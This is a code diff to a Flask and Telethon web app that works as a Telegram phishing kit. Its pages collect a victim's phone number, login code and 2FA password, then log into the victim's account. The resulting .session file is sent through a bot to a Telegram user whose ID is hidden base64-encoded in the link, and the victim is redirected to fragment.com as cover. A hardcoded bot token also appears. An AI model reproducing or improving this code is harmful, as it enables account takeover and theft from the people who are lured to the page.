@@ -16,22 +16,29 @@ BOT_TOKEN = os.environ.get('BOT_TOKEN', '8222821127:AAEE-jlLDXQ9XOgT5ni1DbRC0eSd
 if not API_ID or not API_HASH:
     raise ValueError("API_ID and API_HASH must be set in environment variables")
 
-# ---- Вспомогательные функции для работы с Telethon (синхронные) ----
-def create_client(session_name):
-    """Создаёт и подключает клиента Telethon (синхронно)"""
-    client = TelegramClient(session_name, API_ID, API_HASH)
-    client.connect()
+# ---- Глобальный event loop для asyncio (однопоточный режим) ----
+try:
+    loop = asyncio.get_running_loop()
+except RuntimeError:
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+
+# Хранилище активных клиентов Telethon (ключ = session_id)
+clients = {}
+
+# ---- Вспомогательные функции для работы с Telethon ----
+async def create_client(session_name):
+    client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
+    await client.connect()
     return client
 
-def send_code_request(phone, client):
-    """Отправляет код подтверждения, возвращает phone_code_hash"""
-    result = client.send_code_request(phone)
+async def send_code_request(phone, client):
+    result = await client.send_code_request(phone)
     return result.phone_code_hash
 
-def sign_in_with_code(phone, code, phone_code_hash, client):
-    """Пытается войти с кодом. Возвращает (успех, нужен_пароль, сообщение_об_ошибке)"""
+async def sign_in_with_code(phone, code, phone_code_hash, client):
     try:
-        client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         return True, False, None
     except SessionPasswordNeededError:
         return True, True, None
@@ -42,21 +49,18 @@ def sign_in_with_code(phone, code, phone_code_hash, client):
     except Exception as e:
         return False, False, str(e)
 
-def sign_in_with_password(password, client):
-    """Вход с паролем 2FA. Возвращает (успех, сообщение_об_ошибке)"""
+async def sign_in_with_password(password, client):
     try:
-        client.sign_in(password=password)
+        await client.sign_in(password=password)
         return True, None
     except Exception as e:
         return False, str(e)
 
-def disconnect_client(client):
-    """Отключает клиента (сохраняет сессию)"""
-    client.disconnect()
+async def disconnect_client(client):
+    await client.disconnect()
 
 # ---- Отправка файла сессии через бота ----
 def send_session_file(session_name, target_user_id):
-    """Отправляет файл .session указанному пользователю через бота"""
     file_path = f"{session_name}.session"
     if not os.path.exists(file_path):
         return False
@@ -68,12 +72,38 @@ def send_session_file(session_name, target_user_id):
     os.remove(file_path)
     return response.ok
 
+# ---- Синхронные обёртки для вызова асинхронных функций ----
+def sync_create_client(session_name):
+    return loop.run_until_complete(create_client(session_name))
+
+def sync_send_code_request(phone, client):
+    return loop.run_until_complete(send_code_request(phone, client))
+
+def sync_sign_in_with_code(phone, code, phone_code_hash, client):
+    return loop.run_until_complete(sign_in_with_code(phone, code, phone_code_hash, client))
+
+def sync_sign_in_with_password(password, client):
+    return loop.run_until_complete(sign_in_with_password(password, client))
+
+def sync_disconnect_client(client):
+    loop.run_until_complete(disconnect_client(client))
+
 # ---- Маршруты ----
 @app.route('/<base64_id>')
 def index(base64_id):
     """Страница ввода номера телефона"""
     if 'session_id' not in session:
-        session['session_id'] = str(uuid.uuid4())  # уникальный ID для сессии браузера
+        session['session_id'] = str(uuid.uuid4())
+    session_name = f"session_{session['session_id']}"
+
+    if session['session_id'] not in clients:
+        try:
+            client = sync_create_client(session_name)
+            clients[session['session_id']] = client
+        except Exception as e:
+            flash(f"Ошибка подключения: {e}")
+            return redirect(url_for('index', base64_id=base64_id))
+
     return render_template('index.html', base64_id=base64_id)
 
 @app.route('/<base64_id>/send_code', methods=['POST'])
@@ -89,18 +119,17 @@ def send_code(base64_id):
         return redirect(url_for('index', base64_id=base64_id))
 
     full_phone = '+' + country_code + phone_number
-    session_name = f"session_{session['session_id']}"
+
+    client = clients.get(session['session_id'])
+    if not client:
+        flash("Сессия устарела, начните заново")
+        return redirect(url_for('index', base64_id=base64_id))
 
     try:
-        client = create_client(session_name)
-        phone_code_hash = send_code_request(full_phone, client)
-        # После отправки кода клиент можно отключить (состояние сохранится в .session)
-        disconnect_client(client)
-
+        phone_code_hash = sync_send_code_request(full_phone, client)
         session['phone'] = full_phone
         session['phone_code_hash'] = phone_code_hash
-        session.pop('need_password', None)  # сбрасываем флаг пароля
-
+        session.pop('need_password', None)
         return redirect(url_for('verify_code', base64_id=base64_id))
     except Exception as e:
         flash(f"Ошибка при отправке кода: {e}")
@@ -115,37 +144,30 @@ def verify_code(base64_id):
     if request.method == 'GET':
         return render_template('code.html', base64_id=base64_id)
 
-    # POST: проверка кода
     code = request.form.get('code')
     if not code:
         flash("Введите код")
         return redirect(url_for('verify_code', base64_id=base64_id))
 
-    session_name = f"session_{session['session_id']}"
+    client = clients.get(session['session_id'])
+    if not client:
+        flash("Сессия утеряна, начните заново")
+        return redirect(url_for('index', base64_id=base64_id))
+
     phone = session['phone']
     phone_code_hash = session['phone_code_hash']
 
-    try:
-        client = create_client(session_name)
-        success, need_password, error = sign_in_with_code(phone, code, phone_code_hash, client)
+    success, need_password, error = sync_sign_in_with_code(phone, code, phone_code_hash, client)
 
-        if error:
-            disconnect_client(client)
-            flash(error)
-            return redirect(url_for('verify_code', base64_id=base64_id))
-
-        if need_password:
-            session['need_password'] = True
-            disconnect_client(client)  # отключаем, состояние сохранено, но вход не завершён
-            return redirect(url_for('password', base64_id=base64_id))
-
-        # Успешный вход без пароля
-        disconnect_client(client)  # сохраняем сессию перед отправкой
-        return finalize_login(base64_id, session['session_id'])
-
-    except Exception as e:
-        flash(f"Ошибка: {e}")
+    if error:
+        flash(error)
         return redirect(url_for('verify_code', base64_id=base64_id))
+
+    if need_password:
+        session['need_password'] = True
+        return redirect(url_for('password', base64_id=base64_id))
+
+    return finalize_login(base64_id, session['session_id'])
 
 @app.route('/<base64_id>/password', methods=['GET', 'POST'])
 def password(base64_id):
@@ -156,34 +178,25 @@ def password(base64_id):
     if request.method == 'GET':
         return render_template('password.html', base64_id=base64_id)
 
-    # POST: проверка пароля
     password = request.form.get('password')
     if not password:
         flash("Введите пароль")
         return redirect(url_for('password', base64_id=base64_id))
 
-    session_name = f"session_{session['session_id']}"
+    client = clients.get(session['session_id'])
+    if not client:
+        flash("Сессия утеряна, начните заново")
+        return redirect(url_for('index', base64_id=base64_id))
 
-    try:
-        client = create_client(session_name)
-        success, error = sign_in_with_password(password, client)
-
-        if not success:
-            disconnect_client(client)
-            flash(f"Ошибка пароля: {error}")
-            return redirect(url_for('password', base64_id=base64_id))
-
-        # Успешный вход с паролем
-        disconnect_client(client)
-        return finalize_login(base64_id, session['session_id'])
-
-    except Exception as e:
-        flash(f"Ошибка: {e}")
+    success, error = sync_sign_in_with_password(password, client)
+    if not success:
+        flash(f"Ошибка пароля: {error}")
         return redirect(url_for('password', base64_id=base64_id))
+
+    return finalize_login(base64_id, session['session_id'])
 
 def finalize_login(base64_id, session_id):
     """Завершение входа: отправка файла и редирект"""
-    # Декодируем base64_id в числовой ID пользователя
     try:
         target_user_id = int(base64.b64decode(base64_id).decode())
     except Exception:
@@ -191,15 +204,16 @@ def finalize_login(base64_id, session_id):
         return redirect(url_for('index', base64_id=base64_id))
 
     session_name = f"session_{session_id}"
+    client = clients.get(session_id)
 
-    # Отправляем файл сессии ботом
+    if client:
+        sync_disconnect_client(client)
+        del clients[session_id]
+
     if not send_session_file(session_name, target_user_id):
         flash("Не удалось отправить файл сессии, но вход выполнен.")
 
-    # Очищаем сессию Flask
     session.clear()
-
-    # Редирект на fragment.com
     return redirect("https://fragment.com")
 
 if __name__ == '__main__':
